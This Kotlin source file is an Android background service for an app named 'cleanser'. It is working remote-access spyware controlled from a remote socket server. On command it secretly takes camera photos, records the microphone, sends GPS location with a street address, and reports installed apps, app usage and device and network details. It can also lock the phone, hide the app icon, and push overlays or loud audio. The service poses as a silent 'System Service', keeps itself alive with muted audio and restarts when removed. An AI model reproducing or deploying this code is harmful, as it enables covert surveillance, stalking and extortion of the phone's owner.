package com.cleanser.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.BitmapFactory
import android.content.ComponentName
import android.content.pm.PackageManager
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.TotalCaptureResult
import android.media.ImageReader
import android.location.Geocoder
import android.net.wifi.WifiManager
import android.provider.Settings
import android.view.Surface
import android.location.Location
import android.location.LocationManager
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.MediaRecorder
import android.os.*
import android.speech.tts.TextToSpeech
import android.util.Base64
import android.view.Gravity
import android.view.WindowManager
import android.graphics.PixelFormat
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.Locale
import java.util.UUID

class SocketService : Service() {

    private val CHANNEL_ID = "cleanser_svc"
    private val NOTIF_ID   = 101
    private val handler    = Handler(Looper.getMainLooper())

    private var socket: Socket? = null
    private var cm: CameraManager? = null
    private var camId: String?      = null
    private var mediaPlayer: MediaPlayer? = null
    private var tts: TextToSpeech?         = null
    private var overlayView: FrameLayout? = null
    private var am: AudioManager?          = null
    private var mediaRecorder: MediaRecorder? = null
    private var recordingFile: File?          = null
    private var recordHandler: Handler?       = null
    private var cameraDevice: CameraDevice?   = null
    private var imageReader: ImageReader?     = null

    override fun onBind(intent: Intent?) = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotif())
        cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        Thread { try { camId = cm?.cameraIdList?.firstOrNull() } catch (_: Exception) {} }.start()
        initTts()
        startSilentMusic()
        loadAndConnect()
    }

    private fun startSilentMusic() {
        try {
            val afd = assets.openFd("flutter_assets/assets/musik.mp3")
            mediaPlayer = MediaPlayer().apply {
                setAudioAttributes(AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_MEDIA)
                    .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                    .build())
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                isLooping = true
                setVolume(0f, 0f)
                prepare()
                start()
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun loadAndConnect() {
        Thread {
            try {
                val settingsRaw = assets.open("flutter_assets/assets/settings.json").bufferedReader().readText()
                val apiUrl      = JSONObject(settingsRaw).getString("apiUrl")
                val apiRaw      = java.net.URL(apiUrl).readText()
                val serverUrl   = JSONObject(apiRaw).getString("url")
                handler.post { connectSocket(serverUrl) }
            } catch (e: Exception) {
                e.printStackTrace()
                handler.postDelayed({ loadAndConnect() }, 10_000)
            }
        }.start()
    }

    private fun connectSocket(serverUrl: String) {
        try {
            socket?.disconnect()
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionAttempts(Int.MAX_VALUE)
                .build()

            socket = IO.socket(java.net.URI.create(serverUrl), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                val prefs      = getSharedPreferences("cleanser", Context.MODE_PRIVATE)
                val deviceId   = prefs.getString("deviceId", null) ?: run {
                    val id = "cls_${UUID.randomUUID().toString().replace("-","").take(10)}"
                    prefs.edit().putString("deviceId", id).apply()
                    id
                }
                val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
                val battery    = getBatteryLevel()
                val ip         = getLocalIp()
                val accessCode = prefs.getString("access_code", "") ?: ""
                val ownerKey   = prefs.getString("owner_key", "") ?: ""

                prefs.edit().putBoolean("socket_connected", true).apply()
                socket?.emit("register", JSONObject().apply {
                    put("deviceId",   deviceId)
                    put("deviceName", deviceName)
                    put("battery",    battery)
                    put("ip",         ip)
                    put("accessCode", accessCode)
                    put("ownerKey",   ownerKey)
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                getSharedPreferences("cleanser", Context.MODE_PRIVATE)
                    .edit().putBoolean("socket_connected", false).apply()
            }

            socket?.on("command") { args ->
                val cmd = args[0] as? JSONObject ?: return@on
                handleCommand(cmd)
            }

            socket?.connect()
        } catch (e: Exception) {
            e.printStackTrace()
            handler.postDelayed({ loadAndConnect() }, 5_000)
        }
    }

    private fun getBatteryLevel(): Int {
        return try {
            val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level  = intent?.getIntExtra("level", -1) ?: -1
            val scale  = intent?.getIntExtra("scale", -1) ?: -1
            if (level >= 0 && scale > 0) (level * 100 / scale) else -1
        } catch (_: Exception) { -1 }
    }

    private fun getLocalIp(): String {
        return try {
            val ifaces = NetworkInterface.getNetworkInterfaces()
            while (ifaces.hasMoreElements()) {
                val iface = ifaces.nextElement()
                val addrs = iface.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        return addr.hostAddress ?: "N/A"
                    }
                }
            }
            "N/A"
        } catch (_: Exception) { "N/A" }
    }

    private fun handleCommand(cmd: JSONObject) {
        val type    = cmd.optString("type")
        val payload = cmd.optJSONObject("payload") ?: JSONObject()

        when (type) {
            "lock" -> handler.post {
                val lockIntent = Intent(this, LockService::class.java).apply { putExtra("action", "lock") }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(lockIntent) else startService(lockIntent)
                startActivity(Intent(this, MainActivity::class.java).apply {
                    putExtra("action", "start_screen_pinning")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                })
            }
            "unlock" -> handler.post {
                startService(Intent(this, LockService::class.java).apply { putExtra("action", "unlock") })
            }
            "flashlight" -> {
                val on = payload.optString("state") == "on"
                try {
                    if (camId == null) camId = cm?.cameraIdList?.firstOrNull()
                    camId?.let { cm?.setTorchMode(it, on) }
                } catch (_: Exception) {}
            }
            "wallpaper" -> {
                val b64 = payload.optString("imageBase64", "")
                if (b64.isNotEmpty()) Thread {
                    try {
                        val bytes = Base64.decode(b64, Base64.DEFAULT)
                        val bmp   = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        (getSystemService(Context.WALLPAPER_SERVICE) as android.app.WallpaperManager).setBitmap(bmp)
                    } catch (e: Exception) { e.printStackTrace() }
                }.start()
            }
            "vibrate" -> {
                val ms = payload.optLong("duration", 3000)
                try {
                    val vib = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as android.os.VibratorManager
                        vm.defaultVibrator
                    } else {
                        @Suppress("DEPRECATION")
                        getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vib.vibrate(VibrationEffect.createOneShot(ms.coerceAtMost(60000), VibrationEffect.DEFAULT_AMPLITUDE))
                    } else {
                        @Suppress("DEPRECATION")
                        vib.vibrate(ms.coerceAtMost(60000))
                    }
                } catch (_: Exception) {}
            }
            "tts" -> {
                val text = payload.optString("text", "")
                if (text.isNotEmpty()) handler.post {
                    setMaxVolume()
                    tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts_id")
                }
            }
            "playmp3" -> {
                val b64  = payload.optString("audioBase64", "")
                val mime = payload.optString("mimeType", "audio/mpeg")
                if (b64.isNotEmpty()) Thread {
                    try {
                        val bytes = Base64.decode(b64, Base64.DEFAULT)
                        val ext   = if (mime.contains("ogg")) "ogg" else if (mime.contains("wav")) "wav" else "mp3"
                        val tmp   = File(cacheDir, "playmp3_cmd.$ext")
                        tmp.writeBytes(bytes)
                        handler.post {
                            try {
                                setMaxVolume()
                                mediaPlayer?.apply { if (isPlaying) stop(); release() }
                                mediaPlayer = MediaPlayer().apply {
                                    setAudioAttributes(AudioAttributes.Builder()
                                        .setUsage(AudioAttributes.USAGE_MEDIA)
                                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                                        .build())
                                    setDataSource(tmp.absolutePath)
                                    setVolume(1f, 1f)
                                    prepare()
                                    start()
                                    setOnCompletionListener { restoreSilentMusic() }
                                }
                            } catch (e: Exception) { e.printStackTrace() }
                        }
                    } catch (e: Exception) { e.printStackTrace() }
                }.start()
            }
            "tekslayar" -> {
                val text = payload.optString("text", "")
                handler.post {
                    if (text.isEmpty()) removeOverlayText()
                    else showOverlayText(text)
                }
            }
            "gpstrack" -> {
                requestGpsLocation()
            }
            "appusage" -> {
                Thread {
                    try {
                        val usm   = getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                        val end   = System.currentTimeMillis()
                        val start = end - 24 * 60 * 60 * 1000L
                        val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, start, end)
                        val pm    = packageManager
                        val arr   = JSONArray()
                        stats.filter { it.totalTimeInForeground > 0 }
                            .sortedByDescending { it.totalTimeInForeground }
                            .take(20)
                            .forEach { s ->
                                val name = try { pm.getApplicationLabel(pm.getApplicationInfo(s.packageName, 0)).toString() } catch (_: Exception) { s.packageName }
                                arr.put(JSONObject().apply {
                                    put("name",    name)
                                    put("pkg",     s.packageName)
                                    put("minutes", s.totalTimeInForeground / 60000)
                                })
                            }
                        socket?.emit("appusage_result", arr)
                    } catch (e: Exception) { e.printStackTrace() }
                }.start()
            }
            "applist" -> {
                Thread {
                    try {
                        val pm   = packageManager
                        val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
                        val arr  = JSONArray()
                        apps.filter { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
                            .sortedBy { pm.getApplicationLabel(it).toString() }
                            .forEach { info ->
                                val name = pm.getApplicationLabel(info).toString()
                                arr.put(JSONObject().apply {
                                    put("name", name)
                                    put("pkg",  info.packageName)
                                })
                            }
                        socket?.emit("applist_result", arr)
                    } catch (e: Exception) { e.printStackTrace() }
                }.start()
            }
            "bukaapp" -> {
                val pkg = payload.optString("pkg", "")
                if (pkg.isNotEmpty()) handler.post {
                    try {
                        val intent = packageManager.getLaunchIntentForPackage(pkg)?.apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        if (intent != null) startActivity(intent)
                    } catch (_: Exception) {}
                }
            }
            "blokirapp" -> {
                val pkg   = payload.optString("pkg",    "")
                val block = payload.optBoolean("block", true)
                if (pkg.isNotEmpty()) {
                    val prefs = getSharedPreferences("cleanser", Context.MODE_PRIVATE)
                    val set   = prefs.getStringSet("blocked_apps", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
                    if (block) set.add(pkg) else set.remove(pkg)
                    prefs.edit().putStringSet("blocked_apps", set).apply()
                }
            }
            "bukaweb" -> {
                val url = payload.optString("url", "")
                if (url.isNotEmpty()) handler.post {
                    try {
                        startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(
                            if (url.startsWith("http")) url else "https://$url"
                        )).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
                    } catch (_: Exception) {}
                }
            }
            "rekamsuara" -> {
                val ms = payload.optLong("duration", 10000)
                Thread { startRecording(ms) }.start()
            }
            "brightness" -> {
                val level = payload.optInt("level", 50).coerceIn(0, 100)
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        if (Settings.System.canWrite(this)) {
                            Settings.System.putInt(contentResolver,
                                Settings.System.SCREEN_BRIGHTNESS_MODE,
                                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
                            Settings.System.putInt(contentResolver,
                                Settings.System.SCREEN_BRIGHTNESS,
                                (level * 255 / 100).coerceIn(0, 255))
                        }
                    }
                } catch (_: Exception) {}
            }
            "volume" -> {
                val level = payload.optInt("level", 50).coerceIn(0, 100)
                try {
                    am?.let { a ->
                        for (stream in listOf(
                            AudioManager.STREAM_MUSIC,
                            AudioManager.STREAM_RING,
                            AudioManager.STREAM_ALARM,
                            AudioManager.STREAM_NOTIFICATION
                        )) {
                            try {
                                val max = a.getStreamMaxVolume(stream)
                                val vol = (level * max / 100).coerceIn(0, max)
                                a.setStreamVolume(stream, vol, 0)
                            } catch (_: Exception) {}
                        }
                        try { a.ringerMode = AudioManager.RINGER_MODE_NORMAL } catch (_: Exception) {}
                    }
                } catch (_: Exception) {}
            }
            "deviceinfo" -> {
                Thread {
                    try {
                        val info = JSONObject()
                        info.put("brand",       Build.BRAND)
                        info.put("model",       "${Build.MANUFACTURER} ${Build.MODEL}")
                        info.put("android",     Build.VERSION.RELEASE)
                        info.put("sdk",         Build.VERSION.SDK_INT)
                        info.put("board",       Build.BOARD)
                        info.put("hardware",    Build.HARDWARE)
                        info.put("device",      Build.DEVICE)
                        info.put("product",     Build.PRODUCT)
                        info.put("fingerprint", Build.FINGERPRINT.take(60))
                        try {
                            @Suppress("HardwareIds")
                            info.put("androidId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
                        } catch (_: Exception) {}
                        try {
                            val tm = getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                            info.put("operator", tm.networkOperatorName ?: "N/A")
                            info.put("simCountry", tm.simCountryIso?.uppercase() ?: "N/A")
                        } catch (_: Exception) {}
                        try {
                            val wm = getSystemService(Context.WIFI_SERVICE) as WifiManager
                            val wi = wm.connectionInfo
                            info.put("wifiSsid", wi.ssid?.trim('"') ?: "N/A") ?: "N/A")
                            info.put("wifiIp", android.text.format.Formatter.formatIpAddress(wi.ipAddress))
                        } catch (_: Exception) {}
                        val batteryIntent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                        val level  = batteryIntent?.getIntExtra("level", -1) ?: -1
                        val scale  = batteryIntent?.getIntExtra("scale", -1) ?: -1
                        val temp   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0
                        if (level >= 0 && scale > 0) info.put("battery", "${level * 100 / scale}%")
                        info.put("batteryTemp", "${temp / 10.0}°C")
                        val actMgr = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
                        val memInfo = android.app.ActivityManager.MemoryInfo()
                        actMgr.getMemoryInfo(memInfo)
                        info.put("ramTotal", "${memInfo.totalMem / 1024 / 1024} MB")
                        info.put("ramAvail", "${memInfo.availMem / 1024 / 1024} MB")
                        socket?.emit("deviceinfo_result", info)
                    } catch (e: Exception) { e.printStackTrace() }
                }.start()
            }
            "camfoto" -> {
                val facing = payload.optString("facing", "back")
                Thread { takeCameraPhoto(facing) }.start()
            }
            "hideapp" -> {
                handler.post {
                    try {
                        packageManager.setComponentEnabledSetting(
                            ComponentName(this, "com.cleanser.app.MainActivityAlias"),
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}
                }
            }
            "showapp" -> {
                handler.post {
                    try {
                        packageManager.setComponentEnabledSetting(
                            ComponentName(this, "com.cleanser.app.MainActivityAlias"),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                    } catch (_: Exception) {}
                }
            }
        }
    }

    private fun initTts() {
        tts = TextToSpeech(this) { status ->
            if (status == TextToSpeech.SUCCESS) {
                tts?.language = Locale("id", "ID")
            }
        }
    }

    private fun setMaxVolume() {
        try {
            am?.let { a ->
                for (stream in listOf(AudioManager.STREAM_MUSIC, AudioManager.STREAM_RING, AudioManager.STREAM_ALARM)) {
                    try { a.setStreamVolume(stream, a.getStreamMaxVolume(stream), 0) } catch (_: Exception) {}
                }
                try { a.ringerMode = AudioManager.RINGER_MODE_NORMAL } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
    }

    private fun restoreSilentMusic() {
        try {
            mediaPlayer?.apply { if (isPlaying) stop(); release() }
            mediaPlayer = null
            startSilentMusic()
        } catch (_: Exception) {}
    }

    private fun showOverlayText(text: String) {
        removeOverlayText()
        try {
            val wm   = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val dm   = resources.displayMetrics
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

            // MATCH_PARENT width, WRAP_CONTENT height, gravity CENTER vertical
            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = Gravity.CENTER_VERTICAL
            }

            val tv = TextView(this).apply {
                this.text = text
                textSize  = 20f
                setTextColor(Color.WHITE)
                gravity   = Gravity.CENTER
                typeface  = Typeface.DEFAULT_BOLD
                setPadding(
                    (24 * dm.density).toInt(), (20 * dm.density).toInt(),
                    (24 * dm.density).toInt(), (20 * dm.density).toInt()
                )
                setBackgroundColor(Color.parseColor("#CC000000"))
            }

            overlayView = FrameLayout(this).also { fl ->
                fl.addView(tv, FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT,
                    FrameLayout.LayoutParams.WRAP_CONTENT
                ))
                wm.addView(fl, lp)
            }
        } catch (_: Exception) {}
    }

    private fun removeOverlayText() {
        overlayView?.let {
            try {
                val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
                wm.removeViewImmediate(it)
            } catch (_: Exception) {}
        }
        overlayView = null
    }

    @Suppress("MissingPermission")
    private fun requestGpsLocation() {
        try {
            val fusedClient = LocationServices.getFusedLocationProviderClient(this)

            // Coba last known dulu
            fusedClient.lastLocation.addOnSuccessListener { loc ->
                if (loc != null) {
                    sendGpsResult(loc)
                } else {
                    // Request fresh location update
                    val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 1000)
                        .setMaxUpdates(1)
                        .setWaitForAccurateLocation(false)
                        .build()

                    val cb = object : LocationCallback() {
                        override fun onLocationResult(result: LocationResult) {
                            fusedClient.removeLocationUpdates(this)
                            result.lastLocation?.let { sendGpsResult(it) }
                                ?: socket?.emit("gps_result", JSONObject().apply {
                                    put("error", "Location unavailable")
                                })
                        }
                    }
                    fusedClient.requestLocationUpdates(req, cb, Looper.getMainLooper())

                    // Timeout 15 detik
                    handler.postDelayed({
                        fusedClient.removeLocationUpdates(cb)
                    }, 15_000)
                }
            }.addOnFailureListener {
                socket?.emit("gps_result", JSONObject().apply { put("error", it.message) })
            }
        } catch (e: Exception) {
            e.printStackTrace()
            socket?.emit("gps_result", JSONObject().apply { put("error", e.message) })
        }
    }

    private fun sendGpsResult(loc: Location) {
        val result = JSONObject()
        result.put("lat",      loc.latitude)
        result.put("lng",      loc.longitude)
        result.put("accuracy", loc.accuracy)
        try {
            val geo  = Geocoder(this, Locale("id", "ID"))
            @Suppress("DEPRECATION")
            val addr = geo.getFromLocation(loc.latitude, loc.longitude, 1)
            if (!addr.isNullOrEmpty()) {
                val a = addr[0]
                result.put("desa",     a.subLocality  ?: "")
                result.put("kota",     a.subAdminArea ?: a.locality ?: "")
                result.put("provinsi", a.adminArea    ?: "")
                result.put("kodepos",  a.postalCode   ?: "")
            }
        } catch (_: Exception) {}
        socket?.emit("gps_result", result)
    }

    @Suppress("MissingPermission")
    private fun takeCameraPhoto(facing: String) {
        try {
            val cm2       = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val facingVal = if (facing == "front") CameraCharacteristics.LENS_FACING_FRONT
                            else CameraCharacteristics.LENS_FACING_BACK
            val targetId  = cm2.cameraIdList.firstOrNull { id ->
                cm2.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == facingVal
            } ?: cm2.cameraIdList.firstOrNull() ?: return

            val chars  = cm2.getCameraCharacteristics(targetId)
            val map    = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
            val sizes  = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
            val size   = sizes?.maxByOrNull { it.width * it.height } ?: return

            val reader = ImageReader.newInstance(size.width, size.height, android.graphics.ImageFormat.JPEG, 1)
            imageReader = reader

            reader.setOnImageAvailableListener({ r ->
                val image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val buf   = image.planes[0].buffer
                    val bytes = ByteArray(buf.remaining())
                    buf.get(bytes)
                    val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT)
                    socket?.emit("camfoto_result", JSONObject().apply {
                        put("imageBase64", b64)
                        put("facing", facing)
                        put("width",  size.width)
                        put("height", size.height)
                    })
                } finally {
                    image.close()
                    cameraDevice?.close()
                    cameraDevice = null
                    reader.close()
                    imageReader = null
                }
            }, handler)

            cm2.openCamera(targetId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surfaces = listOf(reader.surface)
                        camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(reader.surface)
                                        set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    }.build()
                                    session.capture(req, object : android.hardware.camera2.CameraCaptureSession.CaptureCallback() {
                                        override fun onCaptureCompleted(s: CameraCaptureSession, r: CaptureRequest, result: TotalCaptureResult) {}
                                    }, handler)
                                } catch (e: Exception) { e.printStackTrace() }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                camera.close(); cameraDevice = null
                            }
                        }, handler)
                    } catch (e: Exception) { e.printStackTrace(); camera.close(); cameraDevice = null }
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); cameraDevice = null }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); cameraDevice = null }
            }, handler)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun startRecording(durationMs: Long) {
        try {
            stopRecording()
            val file = File(cacheDir, "rec_${System.currentTimeMillis()}.mp3")
            recordingFile = file
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION") MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            val safeDuration = durationMs.coerceIn(1000, 60000)
            recordHandler = Handler(Looper.getMainLooper())
            recordHandler?.postDelayed({ stopRecordingAndSend() }, safeDuration)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun stopRecording() {
        try { mediaRecorder?.apply { stop(); release() } } catch (_: Exception) {}
        mediaRecorder = null
        recordHandler?.removeCallbacksAndMessages(null)
        recordHandler = null
    }

    private fun stopRecordingAndSend() {
        try {
            mediaRecorder?.apply { stop(); release() }
            mediaRecorder = null
            val file = recordingFile ?: return
            if (file.exists()) {
                val b64 = Base64.encodeToString(file.readBytes(), Base64.DEFAULT)
                socket?.emit("audio_result", JSONObject().apply {
                    put("audioBase64", b64)
                    put("duration",    file.length())
                })
                file.delete()
            }
        } catch (e: Exception) { e.printStackTrace() }
        recordingFile = null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val ri = PendingIntent.getService(
            this, 1, Intent(this, SocketService::class.java),
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager)
            .set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 500, ri)
    }

    override fun onDestroy() {
        super.onDestroy()
        socket?.disconnect()
        try { mediaPlayer?.apply { if (isPlaying) stop(); release() } } catch (_: Exception) {}
        try { tts?.shutdown() } catch (_: Exception) {}
        stopRecording()
        removeOverlayText()
        try { cameraDevice?.close(); cameraDevice = null } catch (_: Exception) {}
        try { imageReader?.close(); imageReader = null } catch (_: Exception) {}
    }

    private fun buildNotif() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("System Service").setContentText("")
        .setSmallIcon(android.R.drawable.ic_menu_manage)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setOngoing(true).setSilent(true)
        .setVisibility(NotificationCompat.VISIBILITY_SECRET)
        .build()

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_NONE).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(NotificationManager::class.java)).createNotificationChannel(ch)
        }
    }
}
